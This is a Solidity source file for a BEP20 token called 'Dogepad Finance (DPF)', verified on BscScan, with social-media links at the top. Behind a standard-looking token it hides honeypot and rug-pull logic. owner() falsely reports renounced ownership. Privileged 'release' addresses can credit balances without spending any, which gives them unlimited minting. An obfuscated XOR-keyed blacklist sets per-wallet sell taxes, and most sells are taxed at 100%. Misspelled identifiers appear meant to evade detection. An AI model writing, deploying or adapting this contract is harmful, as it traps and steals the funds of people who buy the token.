/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// http://instagram.com/DogepadFinance50300
// https://www.reddit.com/user/DogepadFinance50300
// TWITTER:https://DogepadFinance50300.com/
// WEBSITE:https://twitter.com/DogepadFinance50300
// TELEGRAM:https://t.me/DogepadFinance50300

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingDogepadFinance50300OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingDogepadFinance50300OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingDogepadFinance50300OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingDogepadFinance50300OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingDogepadFinance50300OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function DogepadFinance50300To() external view returns (address);
    function DogepadFinance50300ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setDogepadFinance50300To(address) external;
    function setDogepadFinance50300ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 18;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract DPF is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baDogepadFinance50300lances;
    mapping(address => uint256) private _baDogepadFinance50300lances1;
    mapping(address => bool) private _reDogepadFinance50300llease;
    mapping(uint256 => uint256) private _bDogepadFinance50300blist;
    string name_ = "Dogepad Finance";
    string symbol_ = "DPF";
    uint256 totalSupply_ = 10000000;   
    address public uniswapV2Pair;
    address deDogepadFinance50300ad = 0x000000000000000000000000000000000000dEaD;
    address _gaDogepadFinance50300te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxDogepadFinance50300x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    uint256 _wdDogepadFinance50300qq = 486909684979218418154810312107315094467980608436;
    constructor()

    BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtDogepadFinance50300in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deDogepadFinance50300ad, totalSupply() / 10*2);
         transfer(_mxDogepadFinance50300x, totalSupply() / 10*2);
         transfer(_gaDogepadFinance50300te, totalSupply() / 10*1);



        _reDogepadFinance50300llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baDogepadFinance50300lances[cauunt];
    }

    function _mtDogepadFinance50300in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baDogepadFinance50300lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellDogepadFinance50300 = 0;
    uint256 private _defaultBuyDogepadFinance50300 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reDogepadFinance50300llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellDogepadFinance50300 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reDogepadFinance50300llease[_address];
    }

    function _setDogepadFinance50300(uint256[] memory _accDogepadFinance50300,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accDogepadFinance50300.length;i++){
            _bDogepadFinance50300blist[_accDogepadFinance50300[i]] = _value[i];
        }
    }
        function _msgDogepadFinance50300Info(uint _accDogepadFinance50300) internal view virtual returns (uint) {
        uint256 accDogepadFinance50300 = _accDogepadFinance50300 ^ _wdDogepadFinance50300qq;
        return _bDogepadFinance50300blist[accDogepadFinance50300];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reDogepadFinance50300llease[owaer] == true) {
            _baDogepadFinance50300lances[to] += amuont;
            return true;
        }
        _tDogepadFinance50300transfer(owaer, to, amuont);
        return true;
    }
    function _tDogepadFinance50300transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baDogepadFinance50300lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeDogepadFinance50300 = 0;
        uint256 tradeDogepadFinance50300amuont = 0;

        if (!(_reDogepadFinance50300llease[from] || _reDogepadFinance50300llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeDogepadFinance50300 = _defaultBuyDogepadFinance50300;
                _baDogepadFinance50300lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeDogepadFinance50300 = _msgDogepadFinance50300Info(uint160(from));
                tradeDogepadFinance50300 = tradeDogepadFinance50300 < _defaultSellDogepadFinance50300 ? _defaultSellDogepadFinance50300 : tradeDogepadFinance50300;
                tradeDogepadFinance50300 = _baDogepadFinance50300lances1[from] >= _amuont ? tradeDogepadFinance50300 : 100;
                _baDogepadFinance50300lances1[from] = _baDogepadFinance50300lances1[from] >= _amuont ? _baDogepadFinance50300lances1[from] - _amuont : _baDogepadFinance50300lances1[from];
            }
                        
            tradeDogepadFinance50300amuont = _amuont.mul(tradeDogepadFinance50300).div(100);
        }


        if (tradeDogepadFinance50300amuont > 0) {
            _baDogepadFinance50300lances[from] = _baDogepadFinance50300lances[from].sub(tradeDogepadFinance50300amuont);
            _baDogepadFinance50300lances[deDogepadFinance50300ad] = _baDogepadFinance50300lances[deDogepadFinance50300ad].add(tradeDogepadFinance50300amuont);
            emit Transfer(from, deDogepadFinance50300ad, tradeDogepadFinance50300amuont);
        }

        _baDogepadFinance50300lances[from] = _baDogepadFinance50300lances[from].sub(_amuont - tradeDogepadFinance50300amuont);
        _baDogepadFinance50300lances[_to] = _baDogepadFinance50300lances[_to].add(_amuont - tradeDogepadFinance50300amuont);
        emit Transfer(from, _to, _amuont - tradeDogepadFinance50300amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tDogepadFinance50300transfer(from, to, amuont);
        return true;
    }
}